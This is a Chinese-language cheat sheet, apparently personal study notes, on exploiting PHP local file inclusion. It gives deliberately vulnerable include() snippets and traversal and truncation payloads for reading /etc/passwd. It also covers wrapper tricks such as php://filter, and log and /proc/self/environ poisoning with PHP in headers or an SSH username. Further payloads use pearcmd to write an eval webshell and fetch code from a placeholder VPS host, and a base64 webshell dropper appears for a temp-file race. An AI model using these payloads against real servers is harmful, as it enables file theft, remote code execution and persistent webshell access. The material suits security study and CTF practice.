语言和相关漏洞函数
- PHP: include(), include_once. require(), require_once(), fopen, readfile()
- JSP/Servlet: ava.io.File(), Java.io.FileReader()
- ASP: include file, include virtual

# LFI(Local File Include)本地文件包含
demo
```php
<?php
$file=$_GET['file'];
include($file);
?>
```
上面这段代码是一个最简单的文件包含的代码
利用就是`http://localhost/index.php?file=/etc/passwd`,通过这样的传参方式不管是读取敏感文件，还是去包含别的恶意文件都可以完成
## 目录穿越
这段代码在上面的基础上，对路径的前缀进行了控制，但是事实上还是不安全，不管是在upload文件夹下的其他的恶意文件还是目录穿越都可以进行攻击
```php
<?php
$file=$_GET['file'];
include('/var/www/html/upload/'.$file);
?>
```
比如说还是去读取`/etc/passwd`可以传入这样的url `http://localhost/index.php?file=../../../../etc/passwd`
这样去完成对敏感文件的读取，也就是说`/etc/passwd`是等价于 `/var/www/html/upload/../../../../etc/passwd`的
对于这样的读取方式怎么去防御呢，在php中可以设置`open_basedir`这个设置可以对php进行访问控制使其只能够访问所设置的目录内的文件，即便是写入了一句话木马也难以去对目录外的内容进行访问
当然`open_basedir`是可以通过其他方法来绕过的这里进行举例
- Directoryterator+Glob列举目录
- realpath列举目录
- SplFileInfo::getRealPath列举目录
- GD库iageftbox/imagefttext列举目录
- bindtextdomain暴力猜解目录

[open_basedir绕过](../PHPTrike/open_basedir绕过.md)

## 00字符串截断
在上面的基础上加入对文件名后缀是否能够控制其读取的文件类型呢
```php
<?php
$file=$_GET['file'];
include('/var/www/html/upload/'.$file.'.jpg');
?>
```
上面的代码对文件的类型进行了限制，但是这样的代码同样是不安全的
首先目录穿越仍然存在，其次如果upload文件夹内所上传的文件内容没有做控制，那么就存在图片马的使用可能
那么在控制了后缀名的情况下怎么去完成敏感文件的读取呢，这里仍旧以`/etc/passwd`为例；
当传入`http://localhost/index.php?file=../../../../etc/passwd`时在后面传入`%00`也就是0字节(\\x00)就可以截断后面的字符串
但是00阶段的使用要要求
- php版本小于5.3.4
- php的magic_quotes_gpc为OFF状态   (本特性已自 PHP 5.3.0 起_废弃_并将自 PHP 5.4.0 起_移除_)

## 超长字符串截断
在上面的demo的基础上我们提升php的版本
面对这样的情况怎么去做阶段呢
这里有一个关于操作系统的特性，目录字符串在Windows系统下256字节，Linux系统下4096字节就会到达最大值，最大值之后的字符将会被丢弃，利用 `./`的路径方式就可以构造出超长的目录字符串
`http://localhost/index.php?file=../../../../etc/passwd././././././././././bypass`

## PHP伪协议
在上面的目录穿越中我们提到了`open_basedir`的相关设置是可以通过`反射+glob://`伪协议或者其他的一些Trick来完成绕过的，在这里引入php伪协议在文件包含中的应用
[PHP伪协议](../PHPTrike/PHP伪协议.md)
### file://
`file://`伪协议本身是对本地的文件系统进行访问
### php://input
**利用条件：**
- allow_url_include=On

### php://filter
存在过滤器来进行编码
`index.php?file=php://filter/read=convert.base64-encode/resource=index.php`
### phar://
- php版本高于php5.3.0

### data://
- php版本大于5.2.0
- allow_url_fopen = On
- allow_url_include = On

### zip://
- php版本大于等于php5.3.0

构造zip包的方法同phar。
但使用zip协议，需要指定绝对路径，同时将`#`编码为`%23`，之后填上压缩包内的文件

### glob:///
`glob://`伪协议是php5.3.0版本开始生效的伪协议，它在筛选目录时是不受open_basedir的制约的

## session文件包含

## 日志包含
### 访问日志
web服务器往往会将访问记录写入日志文件中以apache为例，在默认情况下会将日志保留在`/var/log/apache2/access.log`在利用中可以将相应的php代码写入UA头等地方待服务器将其写入了log后对其进行包含
### SSH log
SSH log实际上的利用原理和访问日志是一致的，`/var/log/auth.log`
```shell
ssh '<?php phpinfo();?>'@remotehost
```

## Apache
### .htacess
`AddType application/x-httpd-php .jpg [`

### .user.ini
在所有页面的顶部与底部都加入require语句

`auto_prepend_file`与`auto_append_file
`auto_append_file="/var/log/nginx/access.log"`
## 包含environ
/proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。
**利用条件**
- php以cgi运行，这样environ才会保持UA头
- environ文件可读，且知道文件位置

[shell via LFI - proc/self/environ method (exploit-db.com)](https://www.exploit-db.com/papers/12886)
## pearcmd&peclcmd.php
php<=7.3默认安装pecl/pear
pearcmd位置
- /usr/local/lib/php/pearcmd.php
payload
- 创建test文件
	- `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=@eval($_POST['cmd']);?>+/tmp/test.php`
- 下载外界文件
	- `?+install+--installroot+&file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/test1.php`


## 包含fd
包含原理是和environ类似的，这里给一篇blog和字典
https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method
[fuzzdb/LFI-FD-check.txt at master · tennc/fuzzdb (github.com)](https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt)

```txt
/proc/self/cmdline
/proc/self/stat
/proc/self/status
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/3
/proc/self/fd/4
/proc/self/fd/5
/proc/self/fd/6
/proc/self/fd/7
/proc/self/fd/8
/proc/self/fd/9
/proc/self/fd/10
/proc/self/fd/11
/proc/self/fd/12
/proc/self/fd/13
/proc/self/fd/14
/proc/self/fd/15
/proc/self/fd/16
/proc/self/fd/17
/proc/self/fd/18
/proc/self/fd/19
/proc/self/fd/20
/proc/self/fd/21
/proc/self/fd/22
/proc/self/fd/23
/proc/self/fd/24
/proc/self/fd/25
/proc/self/fd/26
/proc/self/fd/27
/proc/self/fd/28
/proc/self/fd/29
/proc/self/fd/30
/proc/self/fd/31
/proc/self/fd/32
/proc/self/fd/33
/proc/self/fd/34
/proc/self/fd/35
```
## 包含临时文件——条件竞争
由于php本身创建的临时文件，往往是处于PHP允许访问的目录范围的
php处理文件的过程
```
HTTP POST with a file arrives
PHP begins analysis
PHP creates temp file
PHP writes data to temp file
PHP close temp file
script execution begins
[optional] script moves uploaded file
script execution ends
PHP removes temp files(if any)
```

毕竟是临时文件，因此存在时间很短暂，需要利用条件竞争，脚本在下面的pdf中有
[LFI With PHPInfo Assistance](LFI%20With%20PHPInfo%20Assistance.pdf)
本质原理很简单，就是在tmp文件被删除前对其进行包含，最合适的写法是把代码写为当访问后生成一个webshell，以此来保证持续访问
```php
<?php
$a = 'PD9waHAgZXZhbCgkX1JFUVVFU1RbJ3lzeSddKTs/Pg==';
$shellfile = fopen("shell.php",'w');
fwrite($shellfile,base64_decode($a));
fclose($shellfile);
?>
```

# bypass



# 参考文章

[php文件包含漏洞 | Chybeta](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
[LFI、RFI、PHP封装协议安全问题学习 - 郑瀚Andrew - 博客园 (cnblogs.com)](https://www.cnblogs.com/LittleHann/p/3665062.html#3831621)
[1earn/Web_Generic.md at master · wuwumonster/1earn (github.com)](https://github.com/wuwumonster/1earn/blob/master/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/Web_Generic/Web_Generic.md)